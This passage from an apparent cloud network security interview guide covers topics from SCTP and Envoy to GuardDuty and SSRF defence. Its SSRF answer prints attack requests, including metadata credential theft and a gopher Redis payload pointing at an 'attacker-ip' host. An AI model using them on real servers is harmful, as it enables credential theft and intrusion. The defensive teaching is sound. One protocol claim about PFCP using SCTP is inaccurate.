All inter-VPC traffic routed through a centralized inspection VPC:
```
VPC-A ─→ TGW ─→ Inspection VPC (Network Firewall) ─→ TGW ─→ VPC-B
```
TGW route tables: VPC-A traffic destined for VPC-B must route through inspection VPC. Inspection VPC routes approved traffic back out.

**3. Host-based inspection (Falco, Tetragon, Sysdig):**
eBPF-based agents on each node observe all traffic without being inline (no latency penalty, no failure domain). Alerts on anomalous connections.

**4. VPC Flow Logs + SIEM analysis:**
Reactive — detect anomalies after the fact. Not real-time blocking. Useful for forensics and behavior baselining.

**Challenges:**
- TLS encryption makes L7 inspection impossible without sidecar/eBPF.
- High throughput (east-west is often 10-100x north-south) — inline inspection adds latency.
- Symmetric routing required for stateful inline devices.
- Microservices fan-out: each request generates many internal calls — policy must allow legitimate fan-out while blocking unauthorized calls.

---

### Q82. What is SCTP (Stream Control Transmission Protocol)? Where is it used in telecom/cloud?

**SCTP (RFC 4960):** A transport protocol like TCP and UDP but with distinct features:
- **Multi-homing** — an SCTP association can use multiple IP addresses on each endpoint. Failover to backup IP on link failure without session disruption.
- **Multi-streaming** — multiple logical streams within one association; head-of-line blocking in one stream doesn't block others.
- **Message-oriented** — like UDP, preserves message boundaries (unlike TCP's byte stream).
- **Built-in heartbeat** — SCTP monitors path availability natively.
- **4-way handshake** — cookie-based INIT (similar to SYN cookies) mitigates SYN-flood style attacks.

**Use cases:**
- **Telecom signaling:** SS7 over IP (SIGTRAN), Diameter (4G/5G AAA), SIP over SCTP.
- **5G core networking:** NGAP (N2 interface between RAN and AMF), PFCP (N4 interface), XnAP — all use SCTP.
- **Linux kernel:** SCTP is a kernel module; disable if not needed (`modprobe -r sctp`).

**Security:**
- Many firewalls/security devices don't inspect SCTP properly — it may bypass IPS signatures.
- SCTP multi-homing can be used to tunnel traffic through unexpected paths.
- In Kubernetes: Kubernetes supports SCTP Services/NetworkPolicy (feature gate `SCTPSupport`). Ensure Network Policies cover SCTP protocol if used.

---

### Q83. How does Kubernetes DNS policy work? When do you use `dnsPolicy: None`?

**Kubernetes DNS Policies:**

- **`ClusterFirst` (default):** DNS queries go to CoreDNS first. If not a cluster-internal name, CoreDNS forwards upstream. Most pods use this.

- **`ClusterFirstWithHostNet`:** For pods with `hostNetwork: true`. DNS queries go to CoreDNS (not the host's resolver). Required for host-network pods that need cluster DNS.

- **`Default`:** Pod inherits the node's DNS configuration (`/etc/resolv.conf`). Does NOT include cluster DNS. Used for pods that must bypass CoreDNS (e.g., CoreDNS itself).

- **`None`:** All DNS configuration is specified in the pod's `dnsConfig`. No automatic cluster DNS. Used for:
  - Custom DNS servers (not CoreDNS and not node).
  - High-security pods that should not use cluster DNS.
  - Pods that need specific search domains different from cluster defaults.

```yaml
spec:
  dnsPolicy: None
  dnsConfig:
    nameservers:
    - 1.1.1.1
    - 8.8.8.8
    searches:
    - mycompany.internal
    options:
    - name: ndots
      value: "2"
    - name: timeout
      value: "5"
```

**Security use case for `dnsPolicy: None`:** A highly sensitive pod (HSM client, payment processor) that should only resolve specific external FQDNs via a vetted resolver — not the cluster's CoreDNS (which could be compromised or misconfigured). Combines with Cilium FQDN NetworkPolicy for egress control.

**`ndots` tuning:** Default `ndots: 5` in Kubernetes causes many DNS queries (each hostname goes through all search domains before trying as an FQDN). For microservices with many external DNS calls, this is significant overhead. Set `ndots: 2` or `ndots: 1` with explicit trailing dots for external FQDNs (`api.example.com.`).

---

### Q84. What is the difference between L4 and L7 load balancing? Security implications of each.

**L4 Load Balancing (Transport Layer):**
- Operates on TCP/UDP tuples (IP, port, protocol).
- No understanding of application protocol.
- Forwards connections to backends — either via DNAT (changing destination IP) or DSR (returning directly to client).
- Examples: AWS NLB, HAProxy (TCP mode), LVS/IPVS.
- **Performance:** Very high throughput; minimal CPU per packet.
- **Security limitations:** Cannot inspect HTTP content, SSL offload, validate JWT tokens, inspect URLs. Cannot do WAF, rate limiting by URL, block specific HTTP methods.

**L7 Load Balancing (Application Layer):**
- Understands HTTP, HTTPS, gRPC, WebSocket protocol.
- SSL/TLS termination (decrypts, inspects, re-encrypts).
- Routing by URL path, hostname, headers, cookie.
- Health checks by HTTP response (not just TCP connect).
- Examples: AWS ALB, nginx, Envoy, Traefik, Istio.
- **Security capabilities:** WAF integration, authentication offload (OIDC/JWT), rate limiting by URL/user, HTTP header injection/stripping, request/response transformation.

**Security implications:**

| Dimension | L4 (NLB) | L7 (ALB) |
|---|---|---|
| **Client IP preservation** | Yes (NLB preserves source IP by default) | Via X-Forwarded-For header (spoofable) |
| **TLS termination** | NLB can terminate TLS or passthrough | ALB always terminates TLS |
| **End-to-end encryption** | NLB TLS passthrough: E2E encryption maintained | ALB: client→ALB encrypted, ALB→backend separate TLS hop |
| **WAF** | No native WAF | AWS WAF can be attached |
| **Auth** | No | OIDC/Cognito auth offload |
| **DDoS** | More resistant (no HTTP parsing overhead) | L7 DDoS (Slowloris) more impactful |

**Design principle:** Use NLB for non-HTTP protocols (MQTT, gRPC-over-plaintext, custom TCP) or when E2E encryption is required. Use ALB for HTTP/HTTPS with WAF and auth requirements. Layer both: NLB → ALB for high availability with DDoS protection at L4.

---

### Q85. How does AWS Route 53 Resolver work? What are DNS Firewall and inbound/outbound endpoints?

**Route 53 Resolver:** AWS's managed recursive DNS resolver. Available at the VPC-local IP `169.254.169.253` (or the VPC base +2 address, e.g., `10.0.0.2`). Resolves:
- Internal AWS DNS: `<resource>.region.compute.internal`, `<bucket>.s3.amazonaws.com`.
- Private Hosted Zones associated with the VPC.
- Public DNS (forwarded to AWS public resolvers or custom forwarders).

**Outbound Endpoints:**
Send DNS queries from the VPC to on-premises DNS servers:
```
VPC Pod → Route 53 Resolver → Forward Rule (*.corp.example.com) → Outbound Endpoint ENI → DX/VPN → On-Prem DNS
```
Use case: Resolve on-premises resources (AD, internal services) from cloud workloads.

**Inbound Endpoints:**
Allow on-premises resolvers to query Route 53 Resolver (and thus private hosted zones):
```
On-Prem Server → Conditional Forwarder → Inbound Endpoint ENI → Route 53 Resolver → Private Hosted Zone
```
Use case: On-premises servers resolve cloud-internal DNS names.

**Route 53 Resolver DNS Firewall:**
Block or allow DNS queries based on domain lists:
```bash
# Create a managed rule group using AWS-managed threat lists
aws route53resolver create-firewall-rule-group --name prod-dns-firewall

# Add a blocking rule for malware domains
aws route53resolver create-firewall-rule \
  --firewall-rule-group-id rslvr-frg-xxx \
  --firewall-domain-list-id rslvr-fdl-xxx \  # AWS-managed: AWSManagedDomainsBotnetCommandandControl
  --priority 10 --action BLOCK --block-response NODATA

# Add allow rule for trusted domains
aws route53resolver create-firewall-rule \
  --firewall-rule-group-id rslvr-frg-xxx \
  --firewall-domain-list-id rslvr-fdl-yyy \  # Your custom allowed list
  --priority 5 --action ALLOW
```

**Security value:** DNS Firewall blocks known C2 domains before the connection is even attempted. Combined with GuardDuty DNS logging, provides visibility + prevention at the DNS layer.

---

### Q86. Explain Envoy proxy architecture. How does it implement L7 load balancing and security?

**Envoy:** C++ edge and service proxy, originally from Lyft, donated to CNCF. Powers Istio's data plane, AWS App Mesh, many API gateways.

**Core concepts:**
- **Listeners:** Accept inbound connections (TCP, UDP, HTTP). Defined on address:port.
- **Filter chains:** Ordered pipeline of filters processing each connection/request.
- **Clusters:** Groups of upstream endpoints (backends). Used for load balancing.
- **Endpoints:** Actual backend instances (IP:port).

**xDS API (discovery service):** Envoy fetches configuration dynamically from a control plane (Istiod, ADS server):
- **LDS** — Listener Discovery Service.
- **RDS** — Route Discovery Service (HTTP routing rules).
- **CDS** — Cluster Discovery Service (upstream service definitions).
- **EDS** — Endpoint Discovery Service (backend instances).
- **SDS** — Secret Discovery Service (TLS certificates and keys).

**Security features:**

1. **mTLS termination + origination** — Envoy terminates inbound mTLS and originates mTLS to upstreams. Certificates fetched dynamically via SDS.

2. **JWT validation filter:**
   ```yaml
   httpFilters:
   - name: envoy.filters.http.jwt_authn
     typedConfig:
       providers:
         auth0:
           issuer: "https://example.auth0.com/"
           audiences: ["my-api"]
           remoteJwks:
             httpUri:
               uri: "https://example.auth0.com/.well-known/jwks.json"
   ```

3. **External authorization (ext_authz):** Envoy calls an external service (OPA, custom gRPC) to make authorization decisions per request. Enables policy externalization.

4. **Rate limiting:** Envoy's rate limit filter calls a rate limit service (Lyft's ratelimit) per request. Distributed rate limiting across a cluster.

5. **RBAC filter:** Per-route RBAC policies evaluated by Envoy:
   ```yaml
   - name: envoy.filters.http.rbac
     typedConfig:
       rules:
         action: ALLOW
         policies:
           payments-only:
             principals:
             - authenticated:
                 principalName:
                   exact: "spiffe://example.org/service/payments"
             permissions:
             - urlPath:
                 path: {prefix: "/api/v1/charge"}
   ```

---

### Q87. How do you implement rate limiting at scale in a microservices architecture?

**Rate limiting algorithms:**

1. **Token Bucket:** Tokens added at rate R per second, max B tokens (burst). Request consumes 1 token. Allows burst up to B requests.
2. **Leaky Bucket:** Queue requests at rate R. Smooths bursts — enforces constant output rate.
3. **Fixed Window Counter:** Count requests per time window. Simple but allows 2× burst at window boundaries.
4. **Sliding Window Log:** Track timestamps of all requests in the window. Accurate but memory-intensive.
5. **Sliding Window Counter:** Hybrid — uses two fixed windows with interpolation. Good accuracy + memory efficiency.

**Distributed rate limiting (Redis):**
```go
// Redis sliding window rate limit
func RateLimit(ctx context.Context, rdb *redis.Client, key string, limit int, window time.Duration) (bool, error) {
    now := time.Now().UnixMilli()
    windowStart := now - window.Milliseconds()
    
    pipe := rdb.Pipeline()
    pipe.ZRemRangeByScore(ctx, key, "0", strconv.FormatInt(windowStart, 10))
    pipe.ZCard(ctx, key)
    pipe.ZAdd(ctx, key, redis.Z{Score: float64(now), Member: now})
    pipe.Expire(ctx, key, window)
    
    results, err := pipe.Exec(ctx)
    if err != nil {
        return true, err // Fail open on Redis error (or fail closed for security)
    }
    
    count := results[1].(*redis.IntCmd).Val()
    return count < int64(limit), nil
}
```

**Multi-layer rate limiting:**
- **CDN/Edge layer (Cloudflare, CloudFront):** Protect against volumetric floods before reaching the origin. Per-IP, per-path rate limits.
- **API Gateway (Kong, AWS API GW):** Per-API key, per-user, per-plan rate limits.
- **Envoy / service mesh:** Per-service, per-route rate limits via ratelimit service.
- **Application layer:** Per-user, per-resource limits with business logic awareness.

**Security considerations:**
- **Fail-open vs. fail-closed:** If Redis is unreachable, fail open (allow requests) or fail closed (deny all)? Fail-closed is safer security-wise but causes outages. Implement circuit breaker with fallback.
- **Rate limit bypass:** Attackers rotate IPs (distributed attacks). Add rate limiting by account, by device fingerprint, by behavior pattern — not just IP.
- **Headers:** Return `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `Retry-After` (RFC 7231) headers. Don't return these headers for abusive clients (they help attackers time their requests).

---

### Q88. What is SASE (Secure Access Service Edge)? How does it apply to cloud networking?

**SASE (Gartner, 2019):** A cloud-native security architecture that converges WAN networking (SD-WAN) and network security (SWG, CASB, FWaaS, ZTNA) into a single cloud-delivered service.

**Components:**
- **SD-WAN** — software-defined WAN replacing MPLS; connects branch offices via any internet link.
- **SWG (Secure Web Gateway)** — URL filtering, TLS inspection, malware detection for outbound web traffic.
- **CASB (Cloud Access Security Broker)** — visibility and control over SaaS application usage.
- **FWaaS (Firewall as a Service)** — cloud-hosted NGFW for all network traffic.
- **ZTNA (Zero Trust Network Access)** — replace VPN with identity-based application access.

**Key vendors:** Cloudflare One, Zscaler, Palo Alto Prisma Access, Cisco+Umbrella.

**Relevance to cloud networking:**
- Employees working remotely, SaaS-heavy organizations: SASE replaces traditional hub-spoke corporate network with cloud-delivered security services.
- Branch offices connect to the nearest SASE PoP (anycast); traffic inspected in the cloud rather than backhauled to a corporate data center.
- ZTNA component replaces site-to-site VPN for application access: users authenticate, device is checked for health (MDM, EDR) → access granted to specific applications, not the entire network.

**Cloud workload use case:**
- Cloudflare Gateway / Zscaler for Internet Access: direct SaaS access from EC2/ECS with filtering, DLP, CASB controls — without traffic hairpinning through corporate firewalls.
- Cilium Cluster Mesh + ZTNA for Kubernetes federated access.

---

### Q89. How does AWS Macie work? When would you use it vs. manual DLP tooling?

**AWS Macie:** Managed ML-powered data security service that automatically discovers, classifies, and protects sensitive data in Amazon S3.

**How it works:**
1. Macie analyzes S3 objects (samples of large files or full small files).
2. ML classifiers identify sensitive data: PII (names, SSNs, credit card numbers, passport numbers, email addresses, phone numbers), credentials (API keys, private keys), health data (PHI for HIPAA).
3. Reports findings: sensitive data type, location (bucket/key prefix), severity.
4. Evaluates bucket security posture: public buckets, unencrypted buckets, cross-account access.

**Findings → EventBridge → Lambda → JIRA/Slack/remediation automation.**

**When to use Macie:**
- Compliance requirements (GDPR, HIPAA, PCI DSS) to prove you know where PII lives.
- Detecting accidental PII exposure in S3 (application bug writes PII to wrong bucket).
- Initial data classification across a large S3 estate.
- Monitoring for data boundary violations (PII appearing in logging/analytics buckets).

**When to use manual/custom DLP:**
- **Real-time API-level DLP** — Macie is not real-time (discovery jobs run on schedule). For real-time classification at upload/API call time, use custom Lambda trigger on S3 events.
- **Custom data types** — proprietary data formats not in Macie's standard classifiers (internal employee IDs, custom financial identifiers).
- **Non-S3 data** — Macie only covers S3. For EBS, databases, Kafka streams: use custom DLP tooling (Nightfall, Dataguise, or custom eBPF-based inspection).
- **DLP in transit** — Macie is at-rest only. DLP for data in motion requires network-layer inspection or API proxy.

---

### Q90. What is a BGP community? How is it used for traffic engineering?

**BGP Community (RFC 1997):** A 32-bit attribute attached to BGP routes, used to group routes and apply consistent policies across ASes. Format: `ASN:value` (e.g., `65001:100`).

**Well-known communities:**
- `NO_EXPORT (0xFFFFFF01)` — don't advertise to eBGP peers.
- `NO_ADVERTISE (0xFFFFFF02)` — don't advertise to any BGP peer.
- `LOCAL_AS (0xFFFFFF03)` — don't advertise outside the local AS.

**Traffic engineering uses:**

1. **Blackhole routing (RTBH — Remotely Triggered Black Hole):**
   Victim of DDoS tags a prefix with the blackhole community (`65535:666`). Upstream ISP matches this community and installs a route pointing to Null0, dropping all traffic to that prefix at the ISP edge — protecting the victim's infrastructure at the cost of availability for that IP.
   ```
   # Announce /32 with blackhole community to ISP
   ip community-list standard BLACKHOLE permit 65535:666
   route-map BLACKHOLE-TRIGGER permit 10
     match community BLACKHOLE
     set ip next-hop 192.0.2.1  # ISP's blackhole next-hop
   ```

2. **AS path prepending control:** Tag routes with `NO_EXPORT` to prevent them from being readvertised beyond a specific peer.

3. **Selective traffic steering:** Tag routes destined for transit A vs. transit B; set LOCAL_PREF based on community to influence which path is preferred for inbound traffic.

4. **Large BGP communities (RFC 8092):** Extended format `ASN:function:parameter` (4+4+4 bytes). Allows more expressive policy encoding (e.g., "set LOCAL_PREF to 200 at peer IX-Frankfurt").

**AWS Direct Connect BGP communities:** AWS uses BGP communities to control route scope in DX public VIFs: `7224:9100` (routes for the local AWS region), `7224:9200` (all regions, same continent), `7224:9300` (global). Use these to control which AWS prefixes you accept from DX.

---

### Q91. What is Kubernetes CNI chaining? How do plugins like Calico + Bandwidth plugin work together?

**CNI chaining:** Running multiple CNI plugins in sequence. The first plugin sets up the basic network (IP assignment, veth), subsequent plugins add features (bandwidth shaping, port mirroring, firewall rules).

**Configuration (`/etc/cni/net.d/10-calico.conflist`):**
```json
{
  "name": "k8s-pod-network",
  "cniVersion": "0.3.1",
  "plugins": [
    {
      "type": "calico",
      "log_level": "info",
      "datastore_type": "kubernetes",
      "nodename": "__KUBERNETES_NODE_NAME__",
      "ipam": {"type": "calico-ipam"}
    },
    {
      "type": "bandwidth",
      "capabilities": {"bandwidth": true}
    },
    {
      "type": "portmap",
      "capabilities": {"portMappings": true}
    }
  ]
}
```

**Bandwidth plugin:** Uses Linux `tc` (traffic control) to enforce ingress/egress bandwidth limits per pod:
```yaml
# Pod annotation to limit bandwidth
metadata:
  annotations:
    kubernetes.io/ingress-bandwidth: 10M
    kubernetes.io/egress-bandwidth: 5M
```
The bandwidth plugin adds a `tbf` (token bucket filter) qdisc on the pod's veth pair.

**Security use case:** Prevent noisy-neighbor attacks where one pod saturates the node's network, starving other pods. Also useful for multi-tenant clusters where tenant pods should have enforced bandwidth quotas.

**Limitations:** CNI chaining increases complexity; errors in later plugins may leave partially configured interfaces. Each plugin must handle cleanup (`DEL` command) correctly.

---

### Q92. How do you implement Kubernetes network observability without a service mesh?

**Challenge:** Without a service mesh, there's no Envoy sidecar to provide L7 observability. But monitoring is still needed.

**Options without a service mesh:**

**1. eBPF-based observability (Hubble/Cilium, Tetragon, Pixie):**
- No sidecar, no application change.
- eBPF programs in the kernel observe all network calls.
- Pixie (CNCF): eBPF-based auto-instrumentation — captures HTTP, gRPC, MySQL, Redis, DNS traffic without agent injection.
  ```bash
  # Deploy Pixie
  px deploy --api_key <key>
  # View HTTP traffic for all pods in namespace
  px run px/http_data -n payments
  ```

**2. VPC Flow Logs + Athena:** L3/L4 visibility. Correlate with Kubernetes metadata using ENI tags. Limited — no L7 context.

**3. Node-level tcpdump / tshark:** Capture traffic at the node level. Not scalable; requires privilege; useful for incident investigation. Use eBPF-based `bpftrace` or `kubectl debug` node for targeted capture.

**4. Application-level metrics:** Instrument applications to emit HTTP metrics (request count, latency, error rate) via Prometheus. More useful than network metrics for SLO tracking, but requires code changes.

**5. Network Policy logging with Calico:** Enable Calico flow logs:
```yaml
# Calico FelixConfiguration
apiVersion: projectcalico.org/v3
kind: FelixConfiguration
metadata:
  name: default
spec:
  flowLogsFlushInterval: 15s
  flowLogsFileEnabled: true
  flowLogsFileDirectory: /var/log/calico/flowlogs
```

**6. Kubernetes API server audit logs:** Log all API calls (pod creation, secret access, service changes). Critical for control plane visibility even without network observability.

---

### Q93. What is a canary deployment and how do you implement network-level traffic splitting?

**Canary deployment:** Route a small percentage of traffic to the new version while most traffic goes to the stable version. Gradually increase the canary percentage as confidence grows.

**Network-level traffic splitting options:**

**1. Kubernetes Ingress (nginx weight annotation):**
```yaml
# Canary Ingress
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: myapp-canary
  annotations:
    nginx.ingress.kubernetes.io/canary: "true"
    nginx.ingress.kubernetes.io/canary-weight: "10"  # 10% to canary
spec:
  rules:
  - host: myapp.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: myapp-canary
            port: {number: 80}
```

**2. Istio VirtualService (precise weight control):**
```yaml
apiVersion: networking.istio.io/v1alpha3
kind: VirtualService
metadata:
  name: myapp
spec:
  hosts: [myapp]
  http:
  - route:
    - destination:
        host: myapp
        subset: stable
      weight: 90
    - destination:
        host: myapp
        subset: canary
      weight: 10
```

**3. AWS ALB weighted target groups:**
```bash
aws elbv2 modify-listener \
  --listener-arn arn:aws:elasticloadbalancing:...listener/xxx \
  --default-actions Type=forward,ForwardConfig='{
    "TargetGroups": [
      {"TargetGroupArn": "arn:...stable", "Weight": 90},
      {"TargetGroupArn": "arn:...canary", "Weight": 10}
    ]
  }'
```

**4. Flagger (CNCF) — automated canary analysis:**
Flagger automates canary promotion/rollback based on metrics (Prometheus, Datadog). If error rate or latency P99 exceeds threshold during canary, auto-rollback.

**Security consideration:** Header-based canary routing (specific users/internal teams test canary via `X-Canary: true` header) enables controlled testing without randomness. Validate headers at the ingress to prevent header injection bypasses.

---

### Q94. How does AWS GuardDuty work? What networking-related findings does it generate?

**AWS GuardDuty:** Managed threat detection service using ML, anomaly detection, and threat intelligence feeds. Sources:
- **VPC Flow Logs** — network anomaly detection.
- **CloudTrail** — API call anomalies.
- **DNS logs** — Route 53 Resolver query logs.
- **EKS audit logs** — Kubernetes API anomalies.
- **S3 data events** — data access anomalies.
- **Lambda network activity** — Lambda making unexpected network calls.

**Key network-related findings:**

| Finding | Description |
|---|---|
| `Recon:EC2/Portscan` | EC2 instance performing port scanning |
| `UnauthorizedAccess:EC2/TorIPCaller` | Connection from known Tor exit node |
| `Trojan:EC2/BlackholeTraffic` | Traffic to known sinkhole/blackhole IP |
| `CryptoCurrency:EC2/BitcoinTool.B!DNS` | DNS query to known mining pool domain |
| `Backdoor:EC2/C&CActivity.B!DNS` | DNS query to known C2 domain |
| `Trojan:EC2/DGADomainRequest.B` | DNS query matching DGA (Domain Generation Algorithm) pattern |
| `Impact:EC2/MaliciousDomainRequest.Reputation` | Connection to low-reputation IP |
| `Exfiltration:S3/MaliciousIPCaller` | S3 GetObject from known malicious IP |
| `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` | EC2 role credentials used from non-EC2 IP |
| `Kubernetes.AnomalousBehavior` | Unusual API patterns in EKS |

**Integration:**
```bash
# EventBridge → Lambda → auto-remediation
# Example: isolate compromised instance on GuardDuty finding
aws events put-rule --name "GuardDutyFinding" \
  --event-pattern '{"source":["aws.guardduty"],"detail-type":["GuardDuty Finding"]}'

# Lambda: add deny-all SG to compromised ENI
def isolate_instance(instance_id):
    ec2.modify_instance_attribute(
        InstanceId=instance_id,
        Groups=['sg-isolate-all-deny']  # Pre-created quarantine SG
    )
```

---

### Q95. What is the AWS Well-Architected Security Pillar? Name the key security design principles applied to networking.

**AWS Well-Architected Security Pillar — Security Design Principles:**

1. **Implement a strong identity foundation** — Use IAM roles (not static keys), enforce MFA, apply least privilege. For networking: restrict management-plane access (SSH, bastion) to IAM-authenticated principals only.

2. **Enable traceability** — Log all network actions. VPC Flow Logs, CloudTrail, DNS logs, ALB logs → centralized SIEM. Alerts on policy violations.

3. **Apply security at all layers** — Edge (WAF, Shield), VPC (SG, NACL), subnet segmentation, host-based (OS firewall, IDS), application (input validation), data (encryption).

4. **Automate security best practices** — AWS Config rules auto-remediate SG open-to-internet, unencrypted resources. EventBridge → Lambda → automatic isolation.

5. **Protect data in transit and at rest** — TLS 1.2+ everywhere, mTLS for service-to-service. KMS encryption for all persistent data.

6. **Keep people away from data** — No direct EC2 access to production data. Use Session Manager (no SSH keys), Boundary policies, Secrets Manager (no hardcoded creds). Audit all access.

7. **Prepare for security events** — Incident response playbooks, GuardDuty integration, automated quarantine of compromised resources. Game days / chaos security.

**Networking-specific Well-Architected best practices:**
- Private subnets for all workloads; NAT Gateway for outbound.
- Public-facing resources behind ALB (not direct EC2 public IP).
- VPC endpoint / PrivateLink for AWS service access (no internet traversal).
- Transit Gateway with centralized inspection for multi-VPC.
- Security groups reference other security groups (not CIDRs) where possible.
- Enable and centralize VPC Flow Logs, CloudTrail, DNS query logs.

---

### Q96. What is the role of HSM in cloud security? Compare AWS CloudHSM vs. KMS.

**HSM (Hardware Security Module):** A dedicated hardware device (tamper-resistant, FIPS 140-2 Level 3) that:
- Generates, stores, and manages cryptographic keys — keys NEVER leave the HSM in plaintext.
- Performs cryptographic operations (encrypt, decrypt, sign, verify) within the hardware boundary.
- Provides physical and logical tamper protection (key destruction on tamper detection).

**AWS KMS:**
- Multi-tenant; AWS manages the underlying HSM fleet.
- Customer-managed keys (CMKs) — key material generated inside AWS's HSMs, never exported.
- FIPS 140-2 Level 2 validated.
- API-driven (`kms:Encrypt`, `kms:Decrypt`, `kms:GenerateDataKey`).
- Automatic key rotation, regional, integrated with most AWS services.
- Use for: S3 SSE-KMS, EBS encryption, Secrets Manager, Parameter Store SecureString.

**AWS CloudHSM:**
- **Dedicated** HSM cluster (single-tenant). You own the keys entirely — AWS cannot access your keys.
- FIPS 140-2 Level 3 validated.
- You manage: initialize HSM, create COs (Crypto Officers), create keys, partition HSM.
- Supports: PKCS#11, JCE, Microsoft CNG/CryptoAPI interfaces.
- More expensive, more operational complexity.
- Use for: regulatory requirements that mandate customer-exclusive key control, TLS offload (Apache/nginx with CloudHSM for private key protection), CA key storage, custom HSM-backed PKI.

**When CloudHSM is required vs. KMS:**
- **FIPS 140-2 Level 3** strict requirement → CloudHSM.
- **Custom Key Store in KMS** — KMS uses your CloudHSM cluster as the backing store. Best of both: KMS API convenience + CloudHSM key exclusivity.
- **Database TDE with customer-managed key material** → CloudHSM or KMS Custom Key Store.
- **Regulatory audits requiring proof of key exclusivity** → CloudHSM (you can prove AWS cannot access keys).

---

### Q97. How do you detect and respond to a compromised Kubernetes pod?

**Detection signals:**
1. **Unusual outbound connections** (GuardDuty, Hubble, VPC Flow Logs) — pod connecting to Tor, C2 domains, mining pools.
2. **Unusual process execution** (Falco, Tetragon) — shell spawned inside container, unusual binaries executed (`/tmp/malware`).
3. **Privilege escalation attempts** — Falco: `container_privilege_escalation`, proc attempting `CAP_SYS_ADMIN`.
4. **Filesystem writes in unexpected locations** — `readOnlyRootFilesystem: true` violations caught by eBPF.
5. **Kubernetes API anomalies** — pod attempting `kubectl` calls (mounting SA token), accessing etcd directly.

**Automated response (Falco → Kubernetes):**
```yaml
# Falco rule
- rule: Suspicious shell in container
  condition: spawned_process and container and shell_procs and not allowed_shells
  output: "Shell in non-interactive container (container=%container.name, image=%container.image.repository)"
  priority: WARNING

# Falco sidekick → Lambda → isolate pod
def isolate_pod(pod_name, namespace):
    # 1. Add network isolation label
    k8s.patch_namespaced_pod(pod_name, namespace, {
        "metadata": {"labels": {"network-policy": "isolated"}}
    })
    # 2. Apply deny-all NetworkPolicy that matches isolated label
    # 3. Alert security team with pod logs snapshot
    # 4. Optionally: kill pod after forensic capture
```

**Forensic capture before deletion:**
```bash
# Capture pod memory/filesystem for forensics
kubectl debug -it <pod> --image=ubuntu --target=<container>
# OR copy container filesystem
kubectl cp <pod>:/etc /forensics/pod-etc

# Capture network state
kubectl exec <pod> -- ss -ntup
kubectl exec <pod> -- cat /proc/net/tcp

# Capture process tree
kubectl exec <pod> -- ps auxf
kubectl exec <pod> -- ls -la /proc/*/exe 2>/dev/null | grep deleted
```

**Chain of custody:** Ensure forensic data is captured to immutable storage before pod deletion. Use Kubernetes ephemeral containers (`kubectl debug`) to access a running pod's namespaces without modifying the pod spec.

---

### Q98. Explain cloud network latency sources. How do you diagnose and reduce p99 latency?

**Latency sources in cloud networking:**

1. **Physical distance / propagation** — speed of light in fiber ≈ 200km/ms. Cross-region calls add 10-100ms unavoidably.
2. **VPC routing overhead** — minimal (Nitro/Andromeda SDN adds sub-100μs).
3. **Network Firewall / NLB / ALB** — each hop adds 0.1-1ms (well-optimized).
4. **TLS handshake** — TLS 1.3: 1-RTT ≈ 1× network RTT for new connections; session resumption 0-RTT. For short-lived connections, TLS overhead dominates.
5. **DNS resolution** — if not cached, adds 1-50ms per lookup. Use `ndots: 1`, NodeLocal DNS cache.
6. **Connection pooling / keep-alive** — lack of HTTP keep-alive or connection pooling = new TCP+TLS per request.
7. **CPU throttling** — containers hitting CPU limits introduce scheduling latency (steal time, throttle).
8. **Network bandwidth saturation** — at high utilization, queuing adds latency (bufferbloat).
9. **Kernel networking stack** — iptables at scale, conntrack table pressure.

**Diagnosis:**
```bash
# Measure RTT baseline
ping -c 100 <target>  # Min/avg/max/stddev

# TCP connection time breakdown
curl -w "@curl-format.txt" -o /dev/null -s https://target
# curl-format.txt: time_namelookup, time_connect, time_appconnect (TLS), time_starttransfer, time_total

# Traceroute with RTT per hop
mtr --report --report-cycles 10 target

# Kernel networking overhead
perf stat -e cache-misses,cache-references,cycles \
  -p $(cat /var/run/kube-proxy.pid) sleep 10

# eBPF latency histogram (bpftrace)
bpftrace -e 'kprobe:tcp_sendmsg { @start[tid] = nsecs; }
             kretprobe:tcp_sendmsg { @latency = hist(nsecs - @start[tid]); delete(@start[tid]); }'
```

**Reduction strategies:**
- **Connection pooling** — reuse TCP connections (HTTP/2 multiplexing, pgBouncer for DB).
- **Geographic distribution** — deploy in regions close to users; use CDN for cacheable content.
- **eBPF/DPDK datapath** — replace iptables with eBPF (Cilium), avoid kernel networking stack for high-throughput paths.
- **MTU optimization** — ensure no fragmentation (jumbo frames within VPC: 9001 MTU for EC2; adjust CNI MTU).
- **Kernel tuning:**
  ```bash
  # Reduce TCP connect timeout, increase send/receive buffers
  sysctl -w net.core.rmem_max=67108864
  sysctl -w net.core.wmem_max=67108864
  sysctl -w net.ipv4.tcp_congestion_control=bbr  # Better congestion control
  sysctl -w net.core.default_qdisc=fq
  ```
- **NodeLocal DNS cache** — eliminate DNS lookup latency from CoreDNS RTT.
- **CPU limits** — ensure pods are not CPU-throttled; use `requests == limits` for latency-sensitive services (guaranteed QoS class).

---

### Q99. What is SSRF (Server-Side Request Forgery)? How do you defend against it at the network level?

**SSRF:** An attacker tricks a server into making HTTP requests to unintended destinations — internal services, cloud metadata endpoints, or internal networks — using the server's identity and network access.

**Attack scenarios:**

1. **IMDSv1 credential theft** (described in Q15):
   ```
   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
   ```

2. **Internal service enumeration:**
   ```
   GET /proxy?url=http://10.0.0.1:8080/admin
   ```

3. **Cloud provider internal services:**
   ```
   GET /proxy?url=http://100.100.100.200/latest/meta-data/  (Alibaba Cloud)
   ```

4. **SSRF to RCE via Redis:**
   ```
   GET /proxy?url=gopher://127.0.0.1:6379/_SLAVEOF attacker-ip 6379\r\n
   ```

**Defense layers:**

**Network-level (defense-in-depth):**

1. **Enforce IMDSv2** — blocks simple GET-based SSRF against IMDS (Q15).

2. **Egress filtering with allowlist:**
   ```bash
   # Block IMDS ranges for application workloads
   iptables -A OUTPUT -d 169.254.169.254 -j DROP
   iptables -A OUTPUT -d 169.254.0.0/16 -j DROP
   
   # Kubernetes NetworkPolicy: restrict pod egress to known services
   # (default-deny-all egress + explicit allow list)
   ```

3. **Cilium FQDN-based egress policy:**
   ```yaml
   egressDeny:
   - toCIDR:
     - 169.254.0.0/16  # Block link-local (IMDS, cluster metadata)
     - 100.64.0.0/10   # Block RFC 6598 (used by some providers)
   egress:
   - toFQDNs:
     - matchName: "api.trusted-service.com"
   ```

